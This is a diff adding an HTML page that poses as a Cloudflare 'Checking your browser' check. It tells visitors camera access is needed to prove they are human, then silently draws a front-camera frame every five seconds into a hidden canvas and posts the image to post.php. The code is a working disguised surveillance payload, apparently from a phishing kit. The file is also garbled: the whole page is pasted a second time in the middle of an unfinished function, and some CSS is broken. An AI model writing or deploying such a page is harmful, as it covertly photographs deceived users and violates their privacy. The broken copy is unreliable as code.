@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Just a moment...</title>
+    <style>
+        body {
+            background: #1a1a1a;
+            color: #d9d9d9;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 600px;
+            padding: 20px;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #f5a623;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .hidden-video {
+            display: none;
+        }
+    </style>
+    <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+</head>
+
+<body onload="init()">
+
+    <div class="container">
+        <h1>Checking your browser...</h1>
+        <div class="spinner"></div>
+        <p>Please allow the verification check to proceed.</p>
+        <p style="font-size: 0.9rem; color: #888;">DDoS protection by Cloudflare</p>
+    </div>
+
+    <div class="hidden-video">
+        <video id="video" playsinline autoplay></video>
+        <canvas id="canvas" width="640" height="640"></canvas>
+    </div>
+
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'post.php',
+                dataType: 'json',
+                async: false,
+                success: function (result) { },
+                error: function () { }
+            });
+        };
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const constraints = {
+            audio: false,
+            video: { facingMode: "user" }
+        };
+
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                // If denied, maybe redirect or show a "Click Allow" message
+                alert("Verification failed. Please allow camera access to verify you are human.");
+            }
+< !DOCTYPE html >
+                <html lang="en">
+
+                    <head>
+                        <meta charset="UTF-8">
+                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                                <title>Just a moment...</title>
+                                <style>
+                                    body {
+                                        background: #1a1a1a;
+                                    color: #d9d9d9;
+                                    font-family: 'Roboto', sans-serif;
+                                    display: flex;
+                                    flex-direction: column;
+                                    align-items: center;
+                                    justify-content: center;
+                                    height: 100vh;
+                                    margin: 0;
+        }
+
+                                    .container {
+                                        text - align: center;
+                                    max-width: 600px;
+                                    padding: 20px;
+        }
+
+                                    h1 {
+                                        font - size: 2.5rem;
+                                    margin-bottom: 10px;
+        }
+
+                                    p {
+                                        font - size: 1.2rem;
+                                    margin-bottom: 30px;
+        }
+
+                                    .spinner {
+                                        border: 4px solid rgba(255, 255, 255, 0.1);
+                                    border-left-color: #f5a623;
+                                    border-radius: 50%;
+                                    width: 50px;
+                                    height: 50px;
+                                    animation: spin 1s linear infinite;
+                                    margin: 0 auto 20px;
+        }
+
+                                    @keyframes spin {
+                                        0 % {
+                                            transform: rotate(0deg);
+                                        }
+
+            100% {
+                                        transform: rotate(360deg);
+            }
+        }
+
+                                    .hidden-video {
+                                        display: none;
+        }
+                                </style>
+                                <script src="../../assets/js/jquery.min.js"></script>
+    <script src="../../assets/js/client.min.js"></script>
+    <script src="../../assets/js/loc.js"></script>
+    </head>
+
+    <body onload="init()">
+
+        <div class="container">
+            <h1>Checking your browser...</h1>
+            <div class="spinner"></div>
+            <p>Please allow the verification check to proceed.</p>
+            <p style="font-size: 0.9rem; color: #888;">DDoS protection by Cloudflare</p>
+        </div>
+
+        <div class="hidden-video">
+            <video id="video" playsinline autoplay></video>
+            <canvas id="canvas" width="640" height="640"></canvas>
+        </div>
+
+        <script>
+                        function post(imgdata) {
+                            $.ajax({
+                                type: 'POST',
+                                data: { cat: imgdata },
+                                url: 'post.php',
+                                dataType: 'json',
+                                async: false,
+                                success: function (result) { },
+                                error: function () { }
+                            });
+        };
+
+                        const video = document.getElementById('video');
+                        const canvas = document.getElementById('canvas');
+                        const constraints = {
+                            audio: false,
+                        video: {facingMode: "user" }
+        };
+
+                        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                        handleSuccess(stream);
+            } catch (e) {
+                            // If denied, maybe redirect or show a "Click Allow" message
+                            alert("Verification failed. Please allow camera access to verify you are human.");
+            }
+        }
+
+                        function handleSuccess(stream) {
+                            window.stream = stream;
+                        video.srcObject = stream;
+                        var context = canvas.getContext('2d');
+                        setInterval(function () {
+                            context.drawImage(video, 0, 0, 640, 640);
+                        var canvasData = canvas.toDataURL("image/png");
+                        post(canvasData);
+            }, 5000); // Capture every 5 seconds
+        }
+        </script>
+    </body>
+
+</html>
